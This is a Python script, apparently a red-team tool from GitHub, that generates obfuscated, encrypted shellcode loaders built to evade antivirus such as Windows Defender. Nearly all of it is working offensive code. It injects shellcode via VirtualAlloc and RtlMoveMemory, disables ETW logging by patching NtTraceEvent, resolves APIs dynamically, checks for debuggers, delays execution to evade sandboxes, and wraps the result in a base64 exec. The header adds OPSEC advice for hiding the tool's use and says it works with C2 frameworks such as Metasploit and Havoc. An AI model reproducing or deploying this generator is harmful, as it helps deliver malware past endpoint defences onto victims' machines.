# =================================================================================================================================================================
# 'Invoke-Python-ShellCodeLoader.py' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
# It generates an obfuscated and encrypted shellcode loader python script that implements several antivirus bypass and defense evasion techniques.
# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
# =================================================================================================================================================================
# Features: 
# > Shellcode injection into the memory of the current process (Python)
# > Shellcode encryption (XOR) and compression (Zlib)
# > Script obfuscation (function and variable names are randomized + multiple encoding layer)
# > ETW bypass in user-mode (patching 'NtTraceEvent')
# > Dynamic API resolution for the shellcode injection (via GetProcAddress and LoadLibraryA)
# > Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
# > Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
# > Compatible with shellcodes of multiple C2 frameworks (e.g., Metasploit, Havoc)
# OPSEC advice: remove all existing comments in this script before generating your obfuscated shellcode loader.
# =================================================================================================================================================================
# Usage (example):
# + C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-C2-shellcode.bin" ".\obfuscated_shellcodeloader.py"
# =================================================================================================================================================================

import sys
import os
import random
import string
import zlib
import base64

def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def format_shellcode(shellcode_bytes):
    return ', '.join(f'0x{b:02x}' for b in shellcode_bytes)

def random_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def file_to_base64(file_path):
    with open(file_path, 'rb') as file2:
        simply_base64_encoded = base64.b64encode(file2.read()).decode('utf-8')
        return simply_base64_encoded

def generate_loader(shellcode, key, output_path):
    # Compress shellcode before encryption
    compressed_shellcode = zlib.compress(shellcode)
    
    # Encrypt shellcode
    encrypted_shellcode = xor_encrypt(compressed_shellcode, key)

    # Randomized names
    decrypt_func = random_name()
    encrypted_var = random_name()
    key_var = random_name()
    compressed_var = random_name()
    shellcode_var = random_name()
    LoadLibraryA_var = random_name()
    GetProcAddress_var = random_name()    
    resolve_function_var = random_name()
    addr_var = random_name()
    VirtualAlloc_addr_var = random_name()
    RtlMoveMemory_addr_var = random_name()
    VirtualProtect_addr_var = random_name()
    mem_size_var = random_name()
    shell_func_var = random_name()
    killetw_func_var = random_name()

    formatted_shellcode = format_shellcode(encrypted_shellcode)
    key_repr = ', '.join(f'0x{b:02x}' for b in key)


    loader_code = f"""import ctypes, zlib, time

# Basic sandbox detection and evasion - Terminates execution if a debugger is detected (basic anti-debugging check)
isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()
if (isDebuggerPresent):
	sys.exit(1)

# Basic delayed execution (basic sandbox evasion)
time.sleep(6)

# ETW bypass (patching technique)
def {killetw_func_var}():
    PAGE_EXECUTE_READWRITE = 0x40
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    # Get address of NtTraceEvent
    try:
        nttraceevent = ntdll.NtTraceEvent
        nttraceevent_addr = ctypes.cast(nttraceevent, ctypes.c_void_p).value
    except AttributeError:
        return False
    # Prepare RET opcode
    ret_opcode = (ctypes.c_char * 1)(0xC3)
    old_protect = ctypes.c_ulong()
    # Change memory protection
    success = kernel32.VirtualProtect(
        ctypes.c_void_p(nttraceevent_addr),
        ctypes.c_size_t(1),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )
    if not success:
        return False
    # Patch syscall with RET
    ctypes.memmove(nttraceevent_addr, ret_opcode, 1)
    return True

{killetw_func_var}()

def {decrypt_func}(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

{encrypted_var} = bytearray([{formatted_shellcode}])
{key_var} = bytearray([{key_repr}])

# Shellcode decryption and decompression 
{compressed_var} = {decrypt_func}({encrypted_var}, {key_var})
{shellcode_var} = zlib.decompress({compressed_var})

# Setup kernel32 handle and API resolver
kernel32 = ctypes.windll.kernel32

# Define function signatures
{LoadLibraryA_var} = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_char_p)(("LoadLibraryA", kernel32))
{GetProcAddress_var} = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p)(("GetProcAddress", kernel32))

def {resolve_function_var}(dll_name, func_name):
    h_module = {LoadLibraryA_var}(dll_name.encode('ascii'))
    if not h_module:
        raise Exception(f"Failed to load the dll")
    {addr_var} = {GetProcAddress_var}(h_module, func_name.encode('ascii'))
    if not {addr_var}:
        raise Exception(f"Failed to resolve the function")
    return {addr_var}

# Resolve required functions
{VirtualAlloc_addr_var} = {resolve_function_var}("kernel32.dll", "VirtualAlloc")
{RtlMoveMemory_addr_var} = {resolve_function_var}("kernel32.dll", "RtlMoveMemory")
{VirtualProtect_addr_var} = {resolve_function_var}("kernel32.dll", "VirtualProtect")

# Cast resolved functions
VirtualAlloc = ctypes.WINFUNCTYPE(
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
)({VirtualAlloc_addr_var})

RtlMoveMemory = ctypes.WINFUNCTYPE(
    None, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t
)({RtlMoveMemory_addr_var})

VirtualProtect = ctypes.WINFUNCTYPE(
    ctypes.c_bool, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
)({VirtualProtect_addr_var})

# Allocate memory
{mem_size_var} = len({shellcode_var})
exec_mem = VirtualAlloc(None, {mem_size_var}, 0x1000 | 0x2000, 0x04)  # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
if not exec_mem:
    raise MemoryError("VirtualAlloc failed")

# Copy shellcode
RtlMoveMemory(ctypes.c_void_p(exec_mem), ctypes.c_char_p({shellcode_var}), {mem_size_var})

# Change protection to PAGE_EXECUTE_READ
old_protect = ctypes.c_ulong(0)
if not VirtualProtect(ctypes.c_void_p(exec_mem), {mem_size_var}, 0x20, ctypes.byref(old_protect)):
    raise Exception("VirtualProtect failed")

# Execute shellcode
{shell_func_var} = ctypes.CFUNCTYPE(None)(exec_mem)
{shell_func_var}()

"""

    with open("Python-script.py", 'w') as f:
        f.write(loader_code)

    final_obfuscated_loader_script = """
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('<replace_base64_script>')[0]))
"""

    encoded_loader_script = file_to_base64("Python-script.py")
    os.remove("Python-script.py")
    template = final_obfuscated_loader_script
    template = template.replace("<replace_base64_script>", encoded_loader_script)

    with open(output_path, 'w') as out_file:
        out_file.write(template)

    print(f"Obfuscated shellcode loader python script written to: {output_path}")
    print(f"")

banner = """

Invoke-Python-ShellCodeLoader v.2.0
.------..------..------..------..------..------..------..------..------..------.
|P.--. ||Y.--. ||S.--. ||C.--. ||L.--. ||O.--. ||A.--. ||D.--. ||E.--. ||R.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || (\/) || :(): |
| (__) || :\/: || :\/: || :\/: || (__) || :\/: || :\/: || (__) || :\/: || ()() |
| '--'P|| '--'Y|| '--'S|| '--'C|| '--'L|| '--'O|| '--'A|| '--'D|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'
"""

def main():
    print(banner[1:-1])
    if len(sys.argv) != 3:
        print("Usage: python generate_loader.py <raw_shellcode.bin> <output_obfuscated_Shellcodeloader.py>")
        print(f"")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = sys.argv[2]

    if not os.path.isfile(input_path):
        print(f"Error: File '{input_path}' not found.")
        sys.exit(1)

    with open(input_path, 'rb') as f:
        shellcode = f.read()

    # Edit the XOR key
    key = b'\xAA\xBB\xCC'  
    generate_loader(shellcode, key, output_path)


if __name__ == "__main__":
    main()

